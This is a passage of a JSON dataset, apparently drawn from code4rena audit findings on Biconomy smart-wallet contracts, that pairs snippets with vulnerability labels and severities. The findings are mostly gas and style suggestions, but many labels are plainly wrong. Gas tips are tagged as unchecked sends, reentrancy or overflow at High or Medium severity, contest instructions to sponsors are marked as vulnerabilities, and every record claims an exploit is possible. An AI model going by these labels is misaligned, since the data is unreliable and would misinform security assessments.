    "description": "If a function modifier or require such as onlyOwner-admin is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2), DUP1(3), ISZERO(3), PUSH2(3), JUMPI(10), PUSH1(3), DUP1(3), REVERT(0), JUMPDEST(1), POP(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost. 18 results - 5 files: contracts\\smart-contract-wallet\\SmartAccount.sol: 109:     function setOwner(address _newOwner) external mixedAuth { 120:     function updateImplementation(address _implementation) external mixedAuth {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol:\n  100:    for (uint256 i = 0; i < opasLen; i++) {\n\n  107:    for (uint256 a = 0; a < opasLen; a++) {\n\n  112:    for (uint256 i = 0; i < opslen; i++) {\n\n  128:    for (uint256 a = 0; a < opasLen; a++) {\n\n  134:    for (uint256 i = 0; i < opslen; i++) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-22] ++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, as is the case when used in for- and while-loops",
    "description": "The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. 6 results - 2 files: contracts\\smart-contract-wallet\\SmartAccount.sol: 468:    for (uint i = 0; i < dest.length;) { [SmartAccount.sol#L468](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L468)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.322,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[SmartAccount.sol#L83](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L83), [SmartAccount.sol#L232](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L232), [SmartAccount.sol#L495](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L495), [SmartAccount.sol#L511](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L511)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[G-23] Sort Solidity operations using short-circuit mode",
    "description": "Short-circuiting is a solidity contract development model that uses `OR/AND` logic to sequence different cost operations. It puts low gas cost operations in the front and high gas cost operations in the back, so that if the front is low If the cost operation is feasible, you can skip (short-circuit) the subsequent high-cost Ethereum virtual machine operation. //f(x) is a low gas cost operation //g(y) is a high gas cost operation //Sort operations with different gas costs as follows f(x) || g(y)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.603,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n36 results - 36 files:\ncontracts/smart-contract-wallet/BaseSmartAccount.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  6: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAggregator.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  6: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/utils/Exec.sol:\n  2: pragma solidity >=0.7.5 <0.9.0;\n\ncontracts/smart-contract-wallet/base/Executor.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/Enum.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/SecuredTokenTransfer.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/SignatureDecoder.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC777TokensRecipient.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/IERC165.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ISignatureValidator.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/LibAddress.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/Math.sol:\n  4: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/MultiSend.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  2: pragma solidity 0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-25] Use a more recent version of solidity",
    "description": "In 0.8.15 the conditions necessary for inlining are relaxed. Benchmarks show that the change significantly decreases the bytecode size (which impacts the deployment cost) while the effect on the runtime gas usage is smaller. In 0.8.17 prevent the incorrect removal of storage writes before calls to Yul functions that conditionally terminate the external EVM call; Simplify the starting offset of zero-length operations to zero. More efficient overflow checks for multiplication. 36 results - 36 files: contracts/smart-contract-wallet/BaseSmartAccount.sol: 2: pragma solidity 0.8.12;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 110,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\nSighash   |   Function Signature\n========================\naffed0e0  =>  nonce()\nce03fdab  =>  nonce(uint256)\nb0d691fe  =>  entryPoint()\n13af4035  =>  setOwner(address)\n025b22bc  =>  updateImplementation(address)\n1b71bb6e  =>  updateEntryPoint(address)\nf698da25  =>  domainSeparator()\n3408e470  =>  getChainId()\n3d46b819  =>  getNonce(uint256)\n184b9559  =>  init(address,address,address)\n6d5433e6  =>  max(uint256,uint256)\n405c3941  =>  execTransaction(Transaction,uint256,FeeRefund,bytes)\n1bb09224  =>  handlePayment(uint256,uint256,uint256,uint256,address,address)\na18f51e5  =>  handlePaymentRevert(uint256,uint256,uint256,uint256,address,address)\n934f3a11  =>  checkSignatures(bytes32,bytes,bytes)\n37cf6f29  =>  requiredTxGas(address,uint256,bytes,Enum.Operation)\nc9f909f4  =>  getTransactionHash(address,uint256,bytes,Enum.Operation,uint256,uint256,uint256,uint256,address,address,uint256)\n8d6a6751  =>  encodeTransactionData(Transaction,FeeRefund,uint256)\na9059cbb  =>  transfer(address,uint256)\nac85dca7  =>  pullTokens(address,address,uint256)\nb61d27f6  =>  execute(address,uint256,bytes)\n18dfb3c7  =>  executeBatch(address[],bytes[])\n734cd1e2  =>  _call(address,uint256,bytes)\ne8d655cf  =>  execFromEntryPoint(address,uint256,bytes,Enum.Operation,uint256)\nbe484bf7  =>  _requireFromEntryPointOrOwner()\nba74b602  =>  _validateAndUpdateNonce(UserOperation)\n0f4cd016  =>  _validateSignature(UserOperation,bytes32,address)\nc399ec88  =>  getDeposit()\n4a58db19  =>  addDeposit()\n4d44560d  =>  withdrawDepositTo(address,uint256)\n01ffc9a7  =>  supportsInterface(bytes4)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92 SmartAccount.sol function names can be named and sorted according to METHOD ID Sighash   |   Function Signature ======================== affed0e0  =>  nonce()",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\n  30:   solidity: {\n  31:     compilers: [\n  32:       {\n  33:         version: \"0.8.12\",\n  34:         settings: {\n  35:           optimizer: { enabled: true, runs: 200 },\n  36:         },\n  37:       },\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-27] Upgrade Solidity's optimizer",
    "description": "Make sure Solidity\u2019s optimizer is enabled. It reduces gas costs. If you want to gas optimize for contract deployment (costs less to deploy a contract) then set the Solidity optimizer at a low number. If you want to optimize for run-time gas costs (when functions are called on a contract) then set the optimizer to a high number. Set the optimization value higher than 800 in your hardhat.config.ts file. 30:   solidity: { 31:     compilers: [ 32:       {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.209,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "disagree with severity",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Weigh in on severity",
    "description": "Judges have the ultimate discretion in determining severity of issues, as well as whether/how issues are considered duplicates. However, sponsor input is a significant criteria. For a detailed breakdown of severity criteria and how to estimate risk, please refer to [the judging criteria in our documentation](https://docs.code4rena.com/roles/wardens/judging-criteria#estimating-risk-tl-dr). If you disagree with a finding's severity, **leave the severity label intact and add the label** `disagree with severity`, along with a comment indicating your opinion for the judges to review. It is possible for issues to be considered `0 (Non-critical)`. Feel free to use the `question` label for anything you would like additional C4 input on. **Please don't change the severity labels;** that's up to the judge's discretion.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "disagree with severity",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Respond to issues",
    "description": "Label each open/primary High or Medium risk finding as one of these: - `sponsor confirmed`, meaning: \"Yes, this is a problem and we intend to fix it.\" - `sponsor disputed`, meaning either: \"We cannot duplicate this issue\" or \"We disagree that this is an issue at all.\" - `sponsor acknowledged`, meaning: \"Yes, technically the issue is correct, but we are not going to resolve it for xyz reasons.\" (Note: please *don't* use `sponsor disputed` for a finding if you think it should be considered of lower or higher severity. Instead, use the label `disagree with severity` and add comments to recommend a different severity level -- and include your reasoning.)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol#L32-L53",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Potential gas attack using the function multiSend()",
    "description": "================================= `https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/MultiSend.sol#L26-L66` Because there are no safeguards in place to stop an attacker from sending transactions that use a lot of gas, the multiSend() function has the potential vulnerability that I previously described. The possibility exists that the whole transaction will run out of gas and fail if an attacker is able to send a large number of transactions, each of which uses a sizable quantity of gas. Mitigation -----------",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.135,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n100: \tfor (uint256 i = 0; i < opasLen; i++) {\n107: \tfor (uint256 a = 0; a < opasLen; a++) {\n112: \tfor (uint256 i = 0; i < opslen; i++) {\n128: \tfor (uint256 a = 0; a < opasLen; a++) {\n134: \tfor (uint256 i = 0; i < opslen; i++) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "[G-02] UNCHECKING ARITHMETICS OPERATIONS THAT CAN\u2019T UNDERFLOW/OVERFLOW",
    "description": "Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn\u2019t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block. [Reference](https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic) `EntryPoint.sol:` 100: \tfor (uint256 i = 0; i < opasLen; i++) { 107: \tfor (uint256 a = 0; a < opasLen; a++) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.229,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity \nFile: BaseSmartAccount.sol\nFile: Proxy.sol\nFile: SmartAccount.sol\nFile: SmartAccountFactory.sol\nFile: interfaces/ISignatureValidator.sol\nFile: interfaces/ERC1155TokenReceiver.sol\nFile: interfaces/ERC721TokenReceiver.sol\nFile: interfaces/ERC777TokensRecipient.sol\nFile: interfaces/IERC1271Wallet.sol\nFile: common/Singleton.sol\nFile: common/SignatureDecoder.sol\nFile: base/Executor.sol\nFile: common/SecuredTokenTransfer.sol\nFile: base/ModuleManager.sol\nFile: base/FallbackManager.sol\nFile: interfaces/IERC165.sol\nFile: libs/Math.sol\nFile: libs/LibAddress.sol\nFile: paymasters/PaymasterHelpers.sol\nFile: paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\nFile: common/Enum.sol\nFile: libs/MultiSend.sol\nFile: MultiSendCallOnly.sol\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "### [Low-01] Multiple Solidity version used i.e some using ```^0.8.12``` and some using ```0.8.12```",
    "description": "Try to use Updated, stable, and most recent Solidity version to remain bug free Below  Solidity ```^0.8.12``` File: aa-4337/interfaces/IAccount.sol File: aa-4337/core/EntryPoint.sol File: aa-4337/core/SenderCreator.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.749,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: SmartAccount.sol\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L109-L114\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[Low-2] Changing Owner should be a 2 Step-process",
    "description": "*Instances(1)* File: SmartAccount.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L109-L114",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.162,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: lib/MultiSendCallOnly.sol\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol#L21-L59\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[Low-03] ETH could remain stuck in below contracts, as there are no functionality to resuce sent ETH to those contract",
    "description": "*Instances(4)* File: BaseSmartAccount.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L116-L120 File: Proxy.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol#L16",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.179,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: base/FallbackManager.sol\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol#L26-L29\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[Low-04] Absence of Sanity check(zeroAddress check)",
    "description": "When updating fallbackHandler via ```setFallbackHandler()``` missing of zero-address check for function input *Instances(1)* File: base/FallbackManager.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol#L26-L29",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.176,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\npragma solidity 0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "# USE A MORE RECENT VERSION OF SOLIDITY",
    "description": "Use a solidity version of at least 0.8.2 to get simple compiler automatic inclining. Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads. Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper than revert() / require(). Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the call has a return value. Use a solidity version of at least 0.8.12 to get string.concat() to be used instead of abi.encodePacked(<str>,<str>)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.025,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n4\t-\timport \"./libs/LibAddress.sol\";\n8\t-\timport \"./BaseSmartAccount.sol\";\n9\t-\timport \"./common/Singleton.sol\"; \n10\t-\timport \"./base/ModuleManager.sol\"; \n11\t-\timport \"./base/FallbackManager.sol\"; \n12\t-\timport \"./common/SignatureDecoder.sol\"; \n13\t-\timport \"./common/SecuredTokenTransfer.sol\";\n14\t-\timport \"./interfaces/ISignatureValidator.sol\";\n15\t-\timport \"./interfaces/IERC165.sol\";\n\n4\t+\timport {LibAddress} from \"./libs/LibAddress.sol\";\n8\t+\timport {BaseSmartAccount} from \"./BaseSmartAccount.sol\";\n9\t+\timport {Singleton} from \"./common/Singleton.sol\"; \n10\t+\timport {ModuleManager} from \"./base/ModuleManager.sol\"; \n11\t+\timport {FallbackManager} from \"./base/FallbackManager.sol\"; \n12\t+\timport {SignatureDecoder} from \"./common/SignatureDecoder.sol\"; \n13\t+\timport {SecuredTokenTransfer} from \"./common/SecuredTokenTransfer.sol\";\n14\t+\timport {ISignatureValidator} from \"./interfaces/ISignatureValidator.sol\";\n15\t+\timport {IERC165} from \"./interfaces/IERC165.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "USE CUSTOM IMPORTS INSTEAD OF THE PLAIN \u201cIMPORT\u201d \u201cFILE.SOL\u201d",
    "description": "There are 38 instances of this issue: BaseSmartAccount.sol 10\t-\timport \"./common/Enum.sol\"; 10\t+\timport {Enum} from \"./common/Enum.sol\"; SmartAccount.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.963,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n  solidity: {\n    compilers: [\n      {\n        version: \"0.8.12\",\n        settings: {\n          optimizer: { enabled: true, runs: 200 },\n        },\n      },\n      {\n        version: \"0.8.4\",\n        settings: {\n          optimizer: { enabled: true, runs: 200 },\n        },\n      },\n      {\n        version: \"0.8.9\",\n        settings: {\n          optimizer: { enabled: true, runs: 200 },\n        },\n      },\n    ],\n  },\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "SOLIDITY COMPILER OPTIMIZATIONS CAN BE PROBLEMATIC",
    "description": "- [hardhat.config.ts#L35](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/hardhat.config.ts#L35) - [hardhat.config.ts#L41](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/hardhat.config.ts#L41) - [hardhat.config.ts#L47](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/hardhat.config.ts#L47) solidity: { compilers: [",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.42,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n// SPDX-License-Identifier: LGPL-3.0-only\npragma solidity 0.8.12;\ninterface ERC777TokensRecipient {\n    function tokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external;\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "MISSING NATSPEC",
    "description": "[ERC777TokensRecipient.sol](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC777TokensRecipient.sol) // SPDX-License-Identifier: LGPL-3.0-only pragma solidity 0.8.12; interface ERC777TokensRecipient { function tokensReceived(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.305,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449\nThis causes an \"sload\" every time the function gets called, and it is not necessary because only the owner is allowed to call this function, therefore a malicious contract cannot re-enter.\n\n4. Uncessary use of \"nonReentrant\" \n  The handlePayment function uses the \"nonReentrant\" modifier: \n  ",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "1. The initializer modifier in the init function is not needed:",
    "description": "function init( address _owner, address _entryPointAddress, address _handler ) public override initializer",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.418,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nFile:[SmartAccount.sol](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol)\nline:[82](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L82)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "5.USE FUNCTION INSTEAD OF MODIFIERS",
    "description": "File:[SmartAccount.sol](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol) line:[76](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L76) modifier onlyOwner { require(msg.sender == owner, \"Smart Account:: Sender is not authorized\"); _;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.282,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n- import \"../common/Enum.sol\";\n- import \"../common/SelfAuthorized.sol\";\n- import \"./Executor.sol\";\n+ import {Enum} from \"../common/Enum.sol\";\n+ import {SelfAuthorized} from \"../common/SelfAuthorized.sol\";\n+ import {Executor} from \"./Executor.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "## Modularity on import usages",
